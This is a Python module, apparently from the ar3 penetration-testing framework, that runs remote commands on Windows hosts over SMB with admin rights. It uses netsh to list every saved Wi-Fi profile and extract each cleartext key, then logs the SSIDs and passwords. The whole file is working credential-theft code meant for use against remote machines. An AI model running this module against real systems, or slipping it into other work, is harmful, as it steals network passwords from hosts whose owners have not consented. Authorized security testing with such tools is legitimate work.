from ar3.ops.enum.host_enum import code_execution

class WifiPasswords():
    def __init__(self):
        self.name           = 'wifi_passwords'
        self.description    = 'Extract wifi passwords from system'
        self.author         = ['@m8r0wn']
        self.requires_admin = True
        self.exec_methods   = ['wmiexec', 'smbexec', 'atexec']
        self.args           = {}

    def run(self, target, args, smb_con, loggers, config_obj):
        profiles = []
        logger = loggers['console']

        try:
            cmd     = 'netsh wlan show profiles'
            results = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True).splitlines()
            # Quick n dirty error checking...
            if len (results) <= 1:
                logger.fail([smb_con.host, smb_con.ip, self.name.upper(), "{}: {}".format(self.name, results[0])])
                return

            # List all profiles
            for r in results:
                if r.strip().startswith('All User Profile'):
                    try:
                        wifi = r.strip().split(":")[1]
                        profiles.append(wifi.lstrip().rstrip())
                    except:
                        pass

            # Get clear text passwords
            for p in profiles:
                try:
                    cmd     = 'netsh wlan show profile name=\"{}\" key=clear'.format(p)
                    results = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True).splitlines()
                    for result in results:
                        if result.split(":")[0].strip() in ['SSID name', 'Authentication', 'Cipher', 'Key Content']:
                            logger.success([smb_con.host, smb_con.ip, self.name.upper(), result.lstrip()])
                            loggers[args.mode].info('Wifi_Passwords\t{}\t{}\t{}'.format(smb_con.host, smb_con.ip, result.lstrip()))
                except Exception as e:
                    logger.debug([smb_con.host, smb_con.ip, self.name.upper(), "{}: {}".format(self.name, str(e))])

        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))